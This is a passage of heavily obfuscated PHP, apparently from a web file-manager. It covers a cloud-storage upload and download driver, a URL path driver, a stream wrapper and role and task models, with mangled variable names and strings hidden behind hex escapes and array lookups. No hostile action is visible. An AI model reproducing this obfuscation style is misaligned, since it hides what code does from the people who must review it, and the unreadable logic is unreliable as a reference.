$°ÓÌĞİÛ = $ôŸäàùª[$í¸Ğˆœ–[1599]]; $û¦ç˜ÊÓ = fopen($¤ºÀœáÇ, $í¸Ğˆœ–[1476]); if (!$û¦ç˜ÊÓ) { return !1; } do { $·îñõŞÎ = $ôŸäàùª[$í¸Ğˆœ–[1600]]; fseek_64($û¦ç˜ÊÓ, $õªõ·˜²); $üúœØ£Å = fread($û¦ç˜ÊÓ, $·îñõŞÎ); $ÍÄß½…Ä = 0; do { $ÍÄß½…Ä++; $ôŸäàùª = $this->uploadPart($¸¡’æ÷µ, $ôŸäàùª, $üúœØ£Å); } while (!$ôŸäàùª && $ÍÄß½…Ä < 3); if (!$ôŸäàùª) { return !1; } $°ÓÌĞİÛ = $ôŸäàùª[$í¸Ğˆœ–[1599]]; $õªõ·˜² += $·îñõŞÎ; } while ($°ÓÌĞİÛ != -1); fclose($û¦ç˜ÊÓ); $Ö¾æß©Ë = array($í¸Ğˆœ–[1601], $í¸Ğˆœ–[1602] . $ôŸäàùª[$í¸Ğˆœ–[1603]], $í¸Ğˆœ–[1597]); $ÊşŸ†ô½ = $this->ussRequest($¸¡’æ÷µ, $í¸Ğˆœ–[256], !1, $Ö¾æß©Ë); return $ÊşŸ†ô½[$í¸Ğˆœ–[1313]] ? $this->getPathOuter($âÑïÈâ£) : !1; } private function uploadPart($¢Öï€¢, $¡Ÿ¶ÄàĞ, &$üûØÓÊ) { $¾şÄÙ¤å =& $_SERVER[‹‰”››ê]; $ê¾§Î¯ı = array($¾şÄÙ¤å[1604], $¾şÄÙ¤å[1602] . $¡Ÿ¶ÄàĞ[$¾şÄÙ¤å[1603]], $¾şÄÙ¤å[1605] . $¡Ÿ¶ÄàĞ[$¾şÄÙ¤å[1599]], $¾şÄÙ¤å[146] . $¡Ÿ¶ÄàĞ[$¾şÄÙ¤å[1600]]); $•ú½™üï = $this->ussRequest($¢Öï€¢, $¾şÄÙ¤å[256], $üûØÓÊ, $ê¾§Î¯ı); return !$•ú½™üï[$¾şÄÙ¤å[1313]] ? $•ú½™üï[$¾şÄÙ¤å[1313]] : $•ú½™üï[$¾şÄÙ¤å[1303]]; } public function uploadFormData($›€½Ãæ¢, $Ù‡ç§Û± = 3600) { return $this->uploadPolicy($›€½Ãæ¢, $Ù‡ç§Û±); } public function uploadMultiData($°¡×¡Ô›, $õÌÙ¨Š½ = 3600) { $Äõäá¢Ó =& $_SERVER[‹‰”››ê]; $ƒ¤éÉŠ‚ = (int) $GLOBALS[$Äõäá¢Ó[7]][$Äõäá¢Ó[79]]; return $this->uploadPolicy($°¡×¡Ô›, $õÌÙ¨Š½, $ƒ¤éÉŠ‚); } private function uploadPolicy($¶±Ïæõ, $¨Ûüó¼ = 3600, $ ØÀ¯ò = 0) { $‚°¤ÈÑû =& $_SERVER[‹‰”››ê]; $‡¸øŸğº = $‚°¤ÈÑû[8] . $this->bucket; $‚¦˜„‰ = gmdate($‚°¤ÈÑû[1511]); $¿èİÚ† = array($‚°¤ÈÑû[1606] => $this->bucket, $‚°¤ÈÑû[1607] => $¶±Ïæõ, $‚°¤ÈÑû[1608] => time() + $¨Ûüó¼, $‚°¤ÈÑû[1609] => $‚¦˜„‰); if ($ ØÀ¯ò) { $¿èİÚ†[$‚°¤ÈÑû[1496]] = $ ØÀ¯ò; } $˜¾ó…‚¨ = base64_encode(json_encode($¿èİÚ†)); $ğÀ§ ê‰ = base64_encode(hash_hmac($‚°¤ÈÑû[1563], "\x50\117\x53\124\x26{$‡¸øŸğº}\x26{$‚¦˜„‰}\46{$˜¾ó…‚¨}", md5("{$this->userpass}"), !0)); $ÏÑ·ø® = array($‚°¤ÈÑû[280] => $˜¾ó…‚¨, $‚°¤ÈÑû[1610] => "\x55\x50\x59\125\116\x20{$this->username}\x3a{$ğÀ§ ê‰}", $‚°¤ÈÑû[209] => $this->endpoint . $‡¸øŸğº); return $ÏÑ·ø®; } public function download($“ª¶ñâ, $ıîˆŞÎÉ) { $Ñı„Ò©ö = IO::getPathInner(IO::mkfile($ıîˆŞÎÉ)); if (!($¤ ñà¨ = $this->link($“ª¶ñâ))) { return !1; } $üˆ“½¯ = 0; $›Ãô ¡ = 1024 * 200; $©¹ àöŸ = fopen($Ñı„Ò©ö, $_SERVER[‹‰”››ê][1558]); while (!0) { $¥âò·­˜ = $this->fileSubstr($“ª¶ñâ, $üˆ“½¯, $›Ãô ¡); if ($¥âò·­˜ === !1) { return !1; } fwrite($©¹ àöŸ, $¥âò·­˜); $üˆ“½¯ += $›Ãô ¡; if (strlen($¥âò·­˜) < $›Ãô ¡) { break; } } fclose($©¹ àöŸ); return $ıîˆŞÎÉ; } public function link($¤®ê×Ì÷, $ùêöÑä¦ = array()) { $ÎÄ£æ =& $_SERVER[‹‰”››ê]; $¤®ê×Ì÷ = trim($¤®ê×Ì÷, $ÎÄ£æ[8]); if (!empty($this->token)) { $§ôÔ¥´ = strtotime(date($ÎÄ£æ[1611])); $°ÌÒà×… = substr(md5($this->token . $ÎÄ£æ[287] . $§ôÔ¥´ . $ÎÄ£æ[1612] . $¤®ê×Ì÷), 12, 8) . $§ôÔ¥´; $ùêöÑä¦[] = $ÎÄ£æ[1613] . $°ÌÒà×…; } $äìæàö¥ = !empty($ùêöÑä¦) ? $ÎÄ£æ[76] . implode($ÎÄ£æ[287], $ùêöÑä¦) : $ÎÄ£æ[12]; return $this->getHost() . $ÎÄ£æ[8] . $this->pathEncode($¤®ê×Ì÷) . $äìæàö¥; } public function fileOut($öÅ„°ã€, $åÜîÑ×Ş = false, $ñë™ÊéÊ = false, $ù‡™ßâë = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($öÅ„°ã€, $åÜîÑ×Ş, $ñë™ÊéÊ, $ù‡™ßâë); } if (!$ñë™ÊéÊ) { $ñë™ÊéÊ = $this->pathThis($öÅ„°ã€); } $ÉÔıòšº = $åÜîÑ×Ş ? array($_SERVER[‹‰”››ê][1614] . rawurlencode($ñë™ÊéÊ)) : array(); $ëÁ§°£½ = $this->link($öÅ„°ã€, $ÉÔıòšº); $this->fileOutLink($ëÁ§°£½); } public function fileOutServer($Ï•ŞÛ½, $Éí›‡š½ = false, $–™ÂöÏÆ = false, $Í•ıß¢ = '') { parent::fileOut($Ï•ŞÛ½, $Éí›‡š½, $–™ÂöÏÆ, $Í•ıß¢); } public function fileOutImage($è˜’½Á„, $ì«›ä¸£ = 250) { $üî¸Æâé = $this->link($è˜’½Á„ . $_SERVER[‹‰”››ê][1615] . $ì«›ä¸£); $this->fileOutLink($üî¸Æâé); } public function fileOutImageServer($¦üÔ”›, $²åé½ö = 250) { parent::fileOutImage($¦üÔ”›, $²åé½ö); } public function hashMd5($âØ®Óáö) { $‹çï‰ã =& $_SERVER[‹‰”››ê]; $£’ß–È¿ = $this->_objectMeta($âØ®Óáö); return isset($£’ß–È¿[$‹çï‰ã[248]]) ? $£’ß–È¿[$‹çï‰ã[248]] : !1; } public function size($ªÅº½€) { $™¶˜Šìğ = $this->objectMeta($ªÅº½€); return $™¶˜Šìğ ? $™¶˜Šìğ[$_SERVER[‹‰”››ê][79]] : 0; } public function info($¥‚ñô) { if ($this->isFolder($¥‚ñô)) { return $this->folderInfo($¥‚ñô); } else { if ($this->isFile($¥‚ñô)) { return $this->fileInfo($¥‚ñô); } } return !1; } public function exist($Ï¶üŞöÜ) { return $this->isFile($Ï¶üŞöÜ) || $this->isFolder($Ï¶üŞöÜ); } public function isFile($äÃ«°‡ò) { return !$this->isFolder($äÃ«°‡ò) && $this->objectMeta($äÃ«°‡ò); } public function isFolder($–âÄ©—Ä) { return $this->cacheMethod($_SERVER[‹‰”››ê][180], $–âÄ©—Ä); } protected function objectMeta($½öì×ú¼) { return $this->cacheMethod($_SERVER[‹‰”››ê][182], $½öì×ú¼); } protected function _objectMeta($º´º¥”¥) { $Ÿ‰¬ƒ  =& $_SERVER[‹‰”››ê]; if ($º´º¥”¥ == $Ÿ‰¬ƒ [12] || $º´º¥”¥ == $Ÿ‰¬ƒ [8]) { return array(); } $ÄñÄ¼½û = $this->ussRequest($º´º¥”¥, $Ÿ‰¬ƒ [1616]); if (!$ÄñÄ¼½û[$Ÿ‰¬ƒ [1313]]) { return null; } $·ğáµäú = isset($ÄñÄ¼½û[$Ÿ‰¬ƒ [1303]]) ? $ÄñÄ¼½û[$Ÿ‰¬ƒ [1303]] : array(); if (!isset($·ğáµäú[$Ÿ‰¬ƒ [1617]])) { return null; } $°”Å¦Ê™ = array($Ÿ‰¬ƒ [33] => isset($·ğáµäú[$Ÿ‰¬ƒ [1617]]) ? $·ğáµäú[$Ÿ‰¬ƒ [1617]] : null, $Ÿ‰¬ƒ [79] => isset($·ğáµäú[$Ÿ‰¬ƒ [1618]]) ? $·ğáµäú[$Ÿ‰¬ƒ [1618]] : null, $Ÿ‰¬ƒ [248] => isset($·ğáµäú[$Ÿ‰¬ƒ [1619]]) ? $·ğáµäú[$Ÿ‰¬ƒ [1619]] : null, $Ÿ‰¬ƒ [1586] => isset($·ğáµäú[$Ÿ‰¬ƒ [1620]]) ? $·ğáµäú[$Ÿ‰¬ƒ [1620]] : null); $°”Å¦Ê™[$Ÿ‰¬ƒ [1587]] = isset($·ğáµäú[$Ÿ‰¬ƒ [1621]]) ? strtotime($·ğáµäú[$Ÿ‰¬ƒ [1621]]) : $°”Å¦Ê™[$Ÿ‰¬ƒ [1586]]; return $°”Å¦Ê™; } protected function _isFolder($ª²ÒºÒİ) { $âúåôµÆ =& $_SERVER[‹‰”››ê]; if ($ª²ÒºÒİ == $âúåôµÆ[12] || $ª²ÒºÒİ == $âúåôµÆ[8]) { return !0; } $†äĞêÍ¶ = $this->_objectMeta($ª²ÒºÒİ); return isset($†äĞêÍ¶[$âúåôµÆ[33]]) && $†äĞêÍ¶[$âúåôµÆ[33]] == $âúåôµÆ[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($±Ğò÷Æš = false) { } public function exist($Ê›ÃÂšÅ) { $ ì÷Œ”ö = $this->info($Ê›ÃÂšÅ); return $ ì÷Œ”ö[$_SERVER[‹‰”››ê][235]]; } public function isFile($¥Ïƒ˜ÈĞ) { $ÅêÌ¯ôğ = $this->info($¥Ïƒ˜ÈĞ); return $ÅêÌ¯ôğ[$_SERVER[‹‰”››ê][235]]; } public function isFolder($‚æÔÎù) { return !1; } public function size($‰›øóœ) { $ò†²Ù‘æ = $this->info($‰›øóœ); return $ò†²Ù‘æ[$_SERVER[‹‰”››ê][79]]; } public function info($ìæÏ·¢) { return $this->infoParse($ìæÏ·¢); } public function infoAuth($æŒ‚Ë“) { return $this->infoParse($æŒ‚Ë“); } public function infoWithChildren($¿¯ˆ°ª‘) { return $this->infoParse($¿¯ˆ°ª‘); } public function infoFull($¥œ¥ÆÚ£) { return $this->infoParse($¥œ¥ÆÚ£); } private function infoParse($ŠˆÊÑü³) { $ò€³íë¼ =& $_SERVER[‹‰”››ê]; $ò…æ‰¿’ = $this->header($ŠˆÊÑü³); if (!$ò…æ‰¿’ || !$ò…æ‰¿’[$ò€³íë¼[840]]) { return !1; } $ˆ­ÎĞöÈ = _get($ò…æ‰¿’, $ò€³íë¼[424], 0); $ÍÑŠĞ„ = array($ò€³íë¼[32] => $ò…æ‰¿’[$ò€³íë¼[32]], $ò€³íë¼[87] => $ŠˆÊÑü³, $ò€³íë¼[33] => $ò€³íë¼[233], $ò€³íë¼[79] => intval($ˆ­ÎĞöÈ), $ò€³íë¼[169] => get_path_ext($ò…æ‰¿’[$ò€³íë¼[32]]), $ò€³íë¼[1473] => $ˆ­ÎĞöÈ > 0 && $ò…æ‰¿’[$ò€³íë¼[1622]], $ò€³íë¼[1474] => !1); return $ÍÑŠĞ„; } private function header($ª­İ¬Ë­) { $·¬Í¬áü =& $_SERVER[‹‰”››ê]; if (isset(self::$_cacheHeader[$ª­İ¬Ë­])) { return self::$_cacheHeader[$ª­İ¬Ë­]; } $«ëƒÚŞÒ = isset($GLOBALS[$·¬Í¬áü[1623]]) ? $GLOBALS[$·¬Í¬áü[1623]] : !1; $GLOBALS[$·¬Í¬áü[1623]] = !0; self::$_cacheHeader[$ª­İ¬Ë­] = url_header($ª­İ¬Ë­); $GLOBALS[$·¬Í¬áü[1623]] = $«ëƒÚŞÒ; return self::$_cacheHeader[$ª­İ¬Ë­]; } public function hashSimple($˜äóµÚò, $çÓ†ôÚ• = false) { $ßë‡ÈË« =& $_SERVER[‹‰”››ê]; $Ã²óÄú• = $this->info($˜äóµÚò); if (!$Ã²óÄú• || !$Ã²óÄú•[$ßë‡ÈË«[235]]) { return !1; } $Ö™ò‹ğ¶ = $Ã²óÄú•[$ßë‡ÈË«[79]]; $ËÙç¦ûË = 200; $Æ±¬°™ = 50; if ($Ö™ò‹ğ¶ <= $ËÙç¦ûË * $Æ±¬°™) { return md5($this->fileSubstr($˜äóµÚò, 0, $Ö™ò‹ğ¶)) . $Ö™ò‹ğ¶; } $•ÀËÓÀ = intval($Ö™ò‹ğ¶ / $Æ±¬°™); $¤Èˆ›½ = $ßë‡ÈË«[12]; $£™¨´»½ = timeFloat(); $†¬ƒåÈ = 15; for ($èÆÇíŸ¥ = 0; $èÆÇíŸ¥ < $Æ±¬°™; $èÆÇíŸ¥++) { if (timeFloat() - $£™¨´»½ > $†¬ƒåÈ) { return !1; } $‰ÕÍëÉö = $this->fileSubstr($˜äóµÚò, $•ÀËÓÀ * $èÆÇíŸ¥, $ËÙç¦ûË); if (!$‰ÕÍëÉö) { return !1; } $¤Èˆ›½ .= $‰ÕÍëÉö; } $¤Èˆ›½ .= $this->fileSubstr($˜äóµÚò, $Ö™ò‹ğ¶ - $ËÙç¦ûË, $ËÙç¦ûË); return md5($¤Èˆ›½) . $Ö™ò‹ğ¶; } public function getContent($‚Ú’Æ‡¿) { return $this->fileSubstr($‚Ú’Æ‡¿); } public function fileSubstr($ß…È‡ƒÓ, $“æÉîÄ¹ = 0, $ıÅã‘·Ş = -1) { $…‰’†İ— =& $_SERVER[‹‰”››ê]; $“İğ°†ğ = $this->info($ß…È‡ƒÓ); if (!$“İğ°†ğ || !$“İğ°†ğ[$…‰’†İ—[235]] && $“İğ°†ğ[$…‰’†İ—[79]] > 1024 * 1024 * 10) { return !1; } if ($ıÅã‘·Ş === -1) { $ıÅã‘·Ş = $“İğ°†ğ[$…‰’†İ—[79]]; } if ($ıÅã‘·Ş == 0) { return $…‰’†İ—[12]; } $ñÎ´ôèÛ = array($…‰’†İ—[1624] . $“æÉîÄ¹ . $…‰’†İ—[877] . ($“æÉîÄ¹ + $ıÅã‘·Ş - 1)); $ê¿¡¶·ñ = url_request($ß…È‡ƒÓ, $…‰’†İ—[1513], !1, $ñÎ´ôèÛ, !1, !1, 30); return $ê¿¡¶·ñ[$…‰’†İ—[1303]] ? $ê¿¡¶·ñ[$…‰’†İ—[1303]] : $…‰’†İ—[12]; } public function download($†ÖÕÁ÷È, $Ïâ±ŞöÓ) { Downloader::start($†ÖÕÁ÷È, $Ïâ±ŞöÓ); return $Ïâ±ŞöÓ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ı”øë¡­, $ß†êÙ‡à = '') { $this->info = $this->info($ı”øë¡­); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[‹‰”››ê][87]]; $this->pathOpen = $ı”øë¡­; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ı”øë¡­])) { self::$_chunkBuffer[$ı”øë¡­] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($²®ÑÏÄÅ) { $ÇÕÌ¥˜ = $this->fileSubstr($this->pose, $²®ÑÏÄÅ); $this->pose += strlen($ÇÕÌ¥˜); return $ÇÕÌ¥˜; } public function stream_tell() { return $this->pose; } public function stream_seek($—âóçœÂ, $şšƒ©êœ) { $—´ÏÎ‡ì =& $_SERVER[‹‰”››ê]; if ($şšƒ©êœ == SEEK_SET) { $this->pose = $—âóçœÂ; } else { if ($şšƒ©êœ == SEEK_CUR) { $this->pose += $—âóçœÂ; } else { if ($şšƒ©êœ == SEEK_END) { $this->pose = $this->info[$—´ÏÎ‡ì[79]] + intval($—âóçœÂ); } } } if ($—âóçœÂ < 0) { $this->pose = $this->info[$—´ÏÎ‡ì[79]] + $—âóçœÂ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[‹‰”››ê][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ƒÓ—Ì´«, $—«¹ÂĞĞ) { $ŞğÛŠŞ =& $_SERVER[‹‰”››ê]; $àÄõ¥çƒ = $this->info($ƒÓ—Ì´«); return array($ŞğÛŠŞ[1416] => 0, $ŞğÛŠŞ[1625] => 0, $ŞğÛŠŞ[16] => 32768 + 511, $ŞğÛŠŞ[1626] => 0, $ŞğÛŠŞ[1627] => 0, $ŞğÛŠŞ[1628] => 0, $ŞğÛŠŞ[1629] => 0, $ŞğÛŠŞ[79] => $àÄõ¥çƒ[$ŞğÛŠŞ[79]], $ŞğÛŠŞ[1630] => $àÄõ¥çƒ[$ŞğÛŠŞ[1472]], $ŞğÛŠŞ[1587] => $àÄõ¥çƒ[$ŞğÛŠŞ[88]], $ŞğÛŠŞ[1586] => $àÄõ¥çƒ[$ŞğÛŠŞ[234]], $ŞğÛŠŞ[1631] => 0, $ŞğÛŠŞ[1632] => 0); } static $fileInfo = array(); public function info($æ„¼–ü¸) { $° Å¢“ä = $_SERVER[‹‰”››ê][1633]; if (isset(self::$fileInfo[$æ„¼–ü¸])) { return self::$fileInfo[$æ„¼–ü¸]; } if (substr($æ„¼–ü¸, 0, strlen($° Å¢“ä)) != $° Å¢“ä) { return !1; } self::$fileInfo[$æ„¼–ü¸] = IO::info(substr($æ„¼–ü¸, strlen($° Å¢“ä))); return self::$fileInfo[$æ„¼–ü¸]; } public static function read($“ŸÓıñ¦, $Ô²Ší‡», $µˆ—şì) { if (!isset(self::$_fopenCache[$“ŸÓıñ¦])) { $áÛÏ§²å = new StreamWrapperIO(); $áÛÏ§²å->stream_open($“ŸÓıñ¦); self::$_fopenCache[$“ŸÓıñ¦] = $áÛÏ§²å; } $áÛÏ§²å = self::$_fopenCache[$“ŸÓıñ¦]; return $áÛÏ§²å->fileSubstr($Ô²Ší‡», $µˆ—şì); } public static function _read($õ–‰æÆÖ, $¦¡Ñæãç, $şÃÃê†) { $İøî =& $_SERVER[‹‰”››ê]; $ç•‚Ÿ = fopen($õ–‰æÆÖ, $İøî[1476]); if (!$ç•‚Ÿ) { return $İøî[12]; } $è³û•Øü = 8192; fseek($ç•‚Ÿ, $¦¡Ñæãç, SEEK_SET); $üŒ‡Ú­ = $İøî[12]; $Ö¶˜¶µ“ = 0; while ($Ö¶˜¶µ“ < $şÃÃê†) { $»öĞ¾¸» = min($è³û•Øü, $şÃÃê† - $Ö¶˜¶µ“); $üŒ‡Ú­ .= fread($ç•‚Ÿ, $»öĞ¾¸»); $Ö¶˜¶µ“ += $»öĞ¾¸»; } fclose($ç•‚Ÿ); return $üŒ‡Ú­; } public function fileSubstr($¸÷øÒûÔ, $†íõÙç±) { $‡»ÖñíÙ =& $_SERVER[‹‰”››ê]; $ Üı÷ÄÉ = $this->info[$‡»ÖñíÙ[79]]; $ÇúËÊˆı = $¸÷øÒûÔ; $Ú­¿íÖî = $†íõÙç±; if ($¸÷øÒûÔ < 0) { $¸÷øÒûÔ = $ Üı÷ÄÉ + $¸÷øÒûÔ; } if ($†íõÙç± === !1) { $†íõÙç± = $ Üı÷ÄÉ - $¸÷øÒûÔ; } if ($¸÷øÒûÔ + $†íõÙç± > $ Üı÷ÄÉ) { $†íõÙç± = $ Üı÷ÄÉ - $¸÷øÒûÔ; } if ($†íõÙç± <= 0) { return $‡»ÖñíÙ[12]; } if ($¸÷øÒûÔ < 0 || $¸÷øÒûÔ >= $ Üı÷ÄÉ || $†íõÙç± <= 0 || $†íõÙç± > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\x69\x6c\145\x52\x65\x61\144\40\x65\x72\162\157\162\x21\x20\x73\x74\x61\162\164\x3d{$¸÷øÒûÔ}\x3b\154\145\156\x67\164\150\75{$†íõÙç±}\x3b\x20\163\151\172\145\x3d{$ Üı÷ÄÉ}\73"); } $¿†ğí˜ë = 64 * 1024; $ö•ùÜ =& self::$_chunkBuffer[$this->path]; if (!$ö•ùÜ) { $ö•ùÜ = array(); } $ô£ƒ•ˆê = 0; $ µã…ÖŒ = 0; $¤ŒšçÙ = $‡»ÖñíÙ[12]; foreach ($ö•ùÜ as $ô£ƒ•ˆê => $¤ŒšçÙ) { $ô£ƒ•ˆê = intval($ô£ƒ•ˆê); $ µã…ÖŒ = $ô£ƒ•ˆê + strlen($¤ŒšçÙ); if ($¸÷øÒûÔ >= $ µã…ÖŒ) { continue; } if ($¸÷øÒûÔ >= $ô£ƒ•ˆê && $¸÷øÒûÔ + $†íõÙç± <= $ µã…ÖŒ) { return substr($¤ŒšçÙ, $¸÷øÒûÔ - $ô£ƒ•ˆê, $†íõÙç±); } break; } if (count($ö•ùÜ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($‡»ÖñíÙ[1634], $‡»ÖñíÙ[1635] . count($ö•ùÜ) . "\x3b\x73\x74\x61\x72\164\75{$¸÷øÒûÔ}\54\154\x65\156\x67\164\x68\x3d{$†íõÙç±}\x3b\x70\157\163\x65\72{$ô£ƒ•ˆê}\176{$ µã…ÖŒ}"); throw new Exception($‡»ÖñíÙ[1636]); } $µùÔæè¨ = intval($¸÷øÒûÔ / $¿†ğí˜ë) * $¿†ğí˜ë; $¿ËÔÀ¬ = ceil(($¸÷øÒûÔ + $†íõÙç±) / $¿†ğí˜ë) * $¿†ğí˜ë - $µùÔæè¨; $Ğñ¡é»£ = IO::fileSubstr($this->path, $µùÔæè¨, $¿ËÔÀ¬); $ö•ùÜ[$µùÔæè¨ . $‡»ÖñíÙ[12]] = $Ğñ¡é»£; ksort($ö•ùÜ); $ª€ÙÅ»× = substr($Ğñ¡é»£, $¸÷øÒûÔ - $µùÔæè¨, $†íõÙç±); return $ª€ÙÅ»×; } private function log($‡·¶µåÏ, $ë©İË­) { $àñ„¥Æ =& $_SERVER[‹‰”››ê]; $ÈÚĞµ¨Ë = timeFloat() - $this->timeStart; write_log(sprintf($àñ„¥Æ[1637], $‡·¶µåÏ, $this->info[$àñ„¥Æ[32]], $ÈÚĞµ¨Ë, $ë©İË­), $àñ„¥Æ[1280]); } } goto Aâ‰– ºîö; a„–Œ—Ëº¨: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\162\157\x6c\145\x4c\151\163\x74"; public $field = array("\156\141\155\145", "\141\165\x74\x68", "\x6c\141\x62\x65\154", "\144\151\x73\160\x6c\141\x79", "\x73\x79\163\164\x65\155", "\144\x65\163\143", "\151\147\156\157\x72\145\x45\x78\164", "\x69\x67\156\x6f\x72\x65\x46\x69\x6c\x65\123\x69\x7a\x65", "\x61\144\155\x69\x6e\x69\x73\164\162\141\164\x6f\162", "\163\157\x72\164"); public function listData($¾ÒŒÕ¼¬ = false, $ŒºÚ½ = "\163\157\x72\x74", $ºÑ«Æ± = false) { $ÌÁòáÄş =& $_SERVER[‹‰”››ê]; $§î¤Ç£¤ = parent::listData($¾ÒŒÕ¼¬, $ŒºÚ½, $ºÑ«Æ±); if (!$¾ÒŒÕ¼¬) { foreach ($§î¤Ç£¤ as $…€ÒãêÈ => $†ŒØÁ„ó) { if ($†ŒØÁ„ó[$ÌÁòáÄş[2203]] == 1) { $§î¤Ç£¤[$…€ÒãêÈ][$ÌÁòáÄş[538]] = LNG($ÌÁòáÄş[2478]); } } } return $§î¤Ç£¤; } public function update($««µş­ù, $ŸúØ›Ö—) { $œî“¥ =& $_SERVER[‹‰”››ê]; $°“•Áüâ = parent::listData($««µş­ù); $°¬¢ìó÷ = $this->findByName($ŸúØ›Ö—[$œî“¥[32]]); if (!$°“•Áüâ || $°¬¢ìó÷ && $°¬¢ìó÷[$œî“¥[487]] != $°“•Áüâ[$œî“¥[487]]) { return !1; } if ($°¬¢ìó÷[$œî“¥[2203]] == 1) { $ŸúØ›Ö— = array($œî“¥[32] => $ŸúØ›Ö—[$œî“¥[32]], $œî“¥[2015] => $ŸúØ›Ö—[$œî“¥[2015]]); } $this->filterAuth($ŸúØ›Ö—[$œî“¥[499]]); return parent::update($««µş­ù, $ŸúØ›Ö—); } public function remove($Ğ•¦øÙ) { $åİË…á = parent::listData($Ğ•¦øÙ); if (!$åİË…á || $åİË…á[$_SERVER[‹‰”››ê][192]]) { return !1; } return parent::remove($Ğ•¦øÙ); } public function add($œ–øÖáÆ) { $²ú“•ğ =& $_SERVER[‹‰”››ê]; $ÒšÏ—‚ = $œ–øÖáÆ[$²ú“•ğ[32]]; if ($this->findByName($ÒšÏ—‚)) { return !1; } $•ñßö½¸ = array($²ú“•ğ[506] => $ÒšÏ—‚, $²ú“•ğ[1998] => $²ú“•ğ[12], $²ú“•ğ[1994] => $²ú“•ğ[2002], $²ú“•ğ[2479] => 1, $²ú“•ğ[1997] => 0, $²ú“•ğ[2480] => 0, $²ú“•ğ[1996] => $this->getSort()); $œ–øÖáÆ = array_merge($•ñßö½¸, $œ–øÖáÆ); $this->filterAuth($œ–øÖáÆ[$²ú“•ğ[499]]); return parent::insert($œ–øÖáÆ); } private function getSort() { $ãö£œŠ” =& $_SERVER[‹‰”››ê]; $È®å˜ = parent::listData(); $¤ø»§ÑÓ = array_to_keyvalue($È®å˜, $ãö£œŠ”[12], $ãö£œŠ”[2016]); return empty($¤ø»§ÑÓ) ? 0 : max($¤ø»§ÑÓ) + 1; } private function filterAuth(&$áßÏ·õ) { $ºˆò»øÀ =& $_SERVER[‹‰”››ê]; $ÉÍóÄÊ = array(); $ÂÎµß¢™ = array_filter(explode($ºˆò»øÀ[50], $áßÏ·õ)); foreach ($ÂÎµß¢™ as $áßÏ·õ) { $Ëæô±Ğ° = explode($ºˆò»øÀ[10], $áßÏ·õ); if ($Ëæô±Ğ°[0] == $ºˆò»øÀ[2481] && $Ëæô±Ğ°[1] != $ºˆò»øÀ[1291]) { $ùµ‹æ = $Ëæô±Ğ°[0] . $ºˆò»øÀ[10] . $Ëæô±Ğ°[1] . $ºˆò»øÀ[2482]; if (!in_array($ùµ‹æ, $ÂÎµß¢™)) { $ÉÍóÄÊ[] = $ùµ‹æ; } } $ÉÍóÄÊ[] = $áßÏ·õ; } $áßÏ·õ = implode($ºˆò»øÀ[50], $ÉÍóÄÊ); } public function findRoleDefault() { $‚±ƒÀõ± =& $_SERVER[‹‰”››ê]; $Ú»‹ºë = parent::listData(); $ƒóñüÁ = !1; foreach ($Ú»‹ºë as $°Ôëõ¦Ö) { if (!$°Ôëõ¦Ö || $°Ôëõ¦Ö[$‚±ƒÀõ±[2014]] == $‚±ƒÀõ±[231] || $°Ôëõ¦Ö[$‚±ƒÀõ±[2203]] == 1) { continue; } if (strstr($°Ôëõ¦Ö[$‚±ƒÀõ±[499]], $‚±ƒÀõ±[2483])) { continue; } if (!strstr($°Ôëõ¦Ö[$‚±ƒÀõ±[499]], $‚±ƒÀõ±[2484])) { continue; } if (!$ƒóñüÁ) { $ƒóñüÁ = $°Ôëõ¦Ö; continue; } $¤Ğãô©Í = explode($‚±ƒÀõ±[50], $ƒóñüÁ[$‚±ƒÀõ±[499]]); $‘óûÚç” = explode($‚±ƒÀõ±[50], $°Ôëõ¦Ö[$‚±ƒÀõ±[499]]); if (count($¤Ğãô©Í) > count($‘óûÚç”)) { $ƒóñüÁ = $°Ôëõ¦Ö; } } return $ƒóñüÁ ? $ƒóñüÁ[$‚±ƒÀõ±[487]] : $‚±ƒÀõ±[12]; } public function sort($ËØÚµÊö, $ş“ı§¬) { return parent::update($ËØÚµÊö, $ş“ı§¬); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\56\x74\141\163\x6b\114\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\x74\x79\x70\145", "\x65\166\x65\156\164", "\x74\151\155\145", "\144\145\x73\x63", "\x73\171\x73\164\145\155", "\x65\x6e\x61\142\154\x65", "\x6c\x61\x73\x74\122\165\x6e", "\163\x6f\x72\x74"); public function listData($¹ŠÈªä = false, $ÅÖı·²° = "\x73\157\x72\x74", $··š¾óŒ = false) { return parent::listData($¹ŠÈªä, $ÅÖı·²°, $··š¾óŒ); } public function add($£î…—•) { $Õˆßì =& $_SERVER[‹‰”››ê]; $ıëÜäõÒ = $this->findByName($£î…—•[$Õˆßì[32]]); if ($ıëÜäõÒ) { return !1; } $£î…—•[$Õˆßì[1741]] = 0; $£î…—•[$Õˆßì[2016]] = $this->getSort(); return parent::insert($£î…—•); } private function getSort() { $«¼Ø±© =& $_SERVER[‹‰”››ê]; $é˜‰¦µ¬ = parent::listData(); $ù“Ú£»Ø = array_to_keyvalue($é˜‰¦µ¬, $«¼Ø±©[12], $«¼Ø±©[2016]); return empty($ù“Ú£»Ø) ? 0 : max($ù“Ú£»Ø) + 1; } public function update($»ÎÑ£½, $Ö­½ªú) { $Şá’ëœœ =& $_SERVER[‹‰”››ê]; $ÄûØ‘ëÇ = $this->listData($»ÎÑ£½); $³£íÒÈ„ = $this->findByName($Ö­½ªú[$Şá’ëœœ[32]]); if (!$ÄûØ‘ëÇ || $³£íÒÈ„ && $³£íÒÈ„[$Şá’ëœœ[487]] != 